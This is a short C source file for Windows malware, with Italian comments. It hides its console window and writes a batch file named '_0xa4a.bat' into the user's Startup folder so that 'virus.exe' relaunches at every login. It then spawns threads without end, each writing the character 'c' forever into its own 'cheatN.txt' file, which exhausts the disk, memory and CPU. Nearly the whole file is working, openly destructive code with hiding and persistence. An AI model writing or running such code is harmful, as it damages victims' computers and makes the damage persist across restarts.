#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <windows.h> // libreria che uso per nascondere la console
#include <pthread.h>

#ifndef MAX
	#define MAX 100
	void *infinity(void *param);
	void bat();
#else
	#error
#endif

int main(int argc, char *argv[]){
	int n_file;
	srand(time(0));
	pthread_t multi_thread;			// multi thread
	HWND myWindow = GetConsoleWindow();
	ShowWindow(myWindow, SW_HIDE); 	//nascondo la console

	bat();
	for(n_file = 0;;n_file++)
		pthread_create(&multi_thread, NULL, infinity, (void*)n_file);
	pthread_join(multi_thread, NULL);
	return EXIT_SUCCESS;
}


void *infinity(void *param){
	int n_file = (int)param;
	FILE *handle;
	char filename[MAX];
	sprintf(filename, "cheat%d.txt", n_file);
	handle = fopen(filename, "w");
	
	while(1){
		fprintf(handle, "c");
	}
}


void bat(){
	char 
		enviroment[MAX] = "",
		percorso_corrente[MAX] = "";

	strcat(percorso_corrente, "cd ");
	strcat(enviroment, getenv("APPDATA"));
	strcat(enviroment, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\_0xa4a.bat");
	FILE *batch = fopen(enviroment, "w");
	strcat(percorso_corrente, "/");	
	fprintf(batch, "%s", "@echo off\n");
	fprintf(batch, "%s", percorso_corrente);
	fprintf(batch, "%s", "\nvirus.exe");
	fclose(batch);
}
